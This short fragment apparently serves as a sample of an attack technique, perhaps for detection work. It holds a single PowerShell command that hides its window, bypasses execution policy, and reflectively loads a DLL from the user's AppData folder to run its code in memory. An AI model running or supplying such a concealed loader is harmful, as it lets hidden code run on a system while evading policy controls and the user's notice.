# Concealed reflective managed load: policy bypass + hidden window +
# [Reflection.Assembly]::Load over a byte buffer in one command line.
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$p=\"$env:APPDATA\BBWC\S10.dll\";[Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes($p));[E.S]::A('b')"
